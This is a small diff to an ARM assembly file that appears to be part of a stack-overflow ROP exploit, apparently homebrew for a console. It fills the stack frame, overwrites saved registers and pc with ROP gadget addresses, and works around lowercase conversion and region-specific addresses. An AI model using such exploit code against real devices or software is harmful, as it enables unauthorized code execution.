@@ -51,14 +51,10 @@ _start:
 @ Fill the stackframe with 0x44-bytes with value 0x58('X'), which then gets converted to 'x'.
 .fill 0x44, 1, 0x58
 
-#if ROPBUF == 0x082bc1f8//Try to trigger a crash with the CHNTWN region.
-.fill 0x20, 1, 0x59
-#endif
-
 @ The saved registers get overwritten with the below data.
 .word ROPBUFLOC(pivotdata) @ r4. This has to be an address that won't get modifed during lowercase conversion.
 .word ROPBUFLOC(pivotdata) @ r5, same as r4.
-.word ROP_VTABLEFUNCPTR_x10_CALL_R5OBJ @ pc. The string copy ends here due to the nul-terminator in this address. This has to be an address that won't get modifed during lowercase conversion.
+.word ROP_VTABLEFUNCPTR_x10_CALL_R5OBJ @ pc. The string copy ends here due to the nul-terminator in this address. This has to be an address that won't get modifed during lowercase conversion. With CHNTWN this had a 0x00-byte for the low-byte in the addr, so instead it's defined as STACKPIVOT_ADR.
 
 #if (ROPBUF == 0x082bc1f8) || (ROPBUF == 0x082bb450)//Store pivotdata at a different offset for CHNTWN and JPN due to lowercase conversion with the above ptrs.
 .space ((_start + 0x29c) - .)
